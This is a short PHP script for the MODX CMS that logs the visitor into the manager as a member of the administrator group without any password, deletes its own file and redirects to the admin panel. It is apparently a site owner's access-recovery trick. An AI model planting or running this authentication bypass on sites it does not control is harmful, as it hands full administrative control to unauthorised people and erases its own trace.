<?php

define('MODX_API_MODE', true);
require 'index.php';
$member = $modx->getObject('modUserGroupMember', array('user_group' => 1));
$user = $modx->getObject('modUser', $member->member);
$user->addSessionContext('mgr');
unlink(basename(__FILE__));
$modx->sendRedirect('/manager/');